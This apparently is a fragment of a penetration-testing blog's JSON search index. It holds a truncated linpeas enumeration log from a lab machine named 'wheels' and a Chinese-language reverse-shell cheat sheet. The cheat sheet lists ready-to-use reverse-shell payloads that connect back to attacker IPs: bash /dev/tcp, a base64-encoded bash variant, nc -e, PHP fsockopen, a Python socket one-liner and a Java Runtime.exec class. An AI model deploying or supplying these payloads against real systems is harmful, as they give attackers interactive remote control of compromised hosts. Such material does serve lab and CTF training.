▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.1.5 - Safe OSCP by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector RED: You must take a look at it LightCyan: Users with console Blue: Users without console \u0026 mounted devs Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username Starting linpeas. Caching Writable Folders... ════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 5.4.0-113-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 User \u0026 Groups: uid=1000(bob) gid=1000(bob) groups=1000(bob) Hostname: wheels Writable folder: /dev/shm [+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /usr/bin/nc is available for network discover \u0026 port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 5.4.0-113-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 Distributor ID: Ubuntu Description: Ubuntu 20.04.4 LTS Release: 20.04 Codename: focal [+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 [+] USBCreator [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin [+] Date Thu 18 May 2023 09:38:15 AM UTC [+] System stats Filesystem Size Used Avail Use% Mounted on udev 445M 0 445M 0% /dev tmpfs 98M 1.2M 97M 2% /run /dev/sda2 9.8G 5.9G 3.4G 64% / tmpfs 489M 0 489M 0% /dev/shm tmpfs 5.0M 0 5.0M 0% /run/lock tmpfs 489M 0 489M 0% /sys/fs/cgroup /dev/loop0 56M 56M 0 100% /snap/core18/2409 /dev/loop4 45M 45M 0 100% /snap/snapd/15904 /dev/loop1 56M 56M 0 100% /snap/core18/2128 /dev/loop2 62M 62M 0 100% /snap/core20/1434 /dev/loop5 45M 45M 0 100% /snap/snapd/15534 /dev/loop6 71M 71M 0 100% /snap/lxd/21029 /dev/loop3 68M 68M 0 100% /snap/lxd/22753 tmpfs 98M 0 98M 0% /run/user/1000 total used free shared buff/cache available Mem: 1000244 279992 85420 3608 634832 527740 Swap: 1994748 3596 1991152 [+] CPU info Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian Addres","date":"2023-12-07","objectID":"/wheels/:0:0","tags":["靶场"],"title":"wheels","uri":"/wheels/"},{"categories":null,"content":"反弹shell的各种编码各种语言 base64编码后的linux下/bin/bash反弹shell: bash -c ‘{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTMuMC4yNDMvMTIzNDUgMD4mMQ=}|{base64,-d}|{bash,-i}’ linux的/bin/bash版本反弹shell： bash -i \u003e\u0026 /dev/tcp/192.168.45.217/1234 0\u003e\u00261 bash -c “bash -i \u003e\u0026 /dev/tcp/192.168.45.226/443 0\u003e\u00261” nc -e /bin/bash 192.168.45.5 1234 nc 192.168.45.5 1234|/bin/bash|192.168.45.5 12345 php -r '$sock=fsockopen(\"192.168.45.5\",1234);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' java反弹shell源码: public class Revs { /** * @param args\r* @throws Exception */\rpublic static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",“exec 5\u003c\u003e/dev/tcp/192.168.99.242/1234;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done”}; Process p = r.exec(cmd); p.waitFor(); } } javac将.java为jar执行 python互动式终端： python -c ‘import pty; pty.spawn (\"/bin/bash\")’ python3 -c ‘import pty; pty.spawn (\"/bin/bash\")’ python反弹shell python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘10.10.16.9’,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([’/bin/bash’,’-i’]);” ","date":"2023-12-07","objectID":"/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/:0:0","tags":null,"title":"反弹shell的各种编码各种语言","uri":"/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/"}]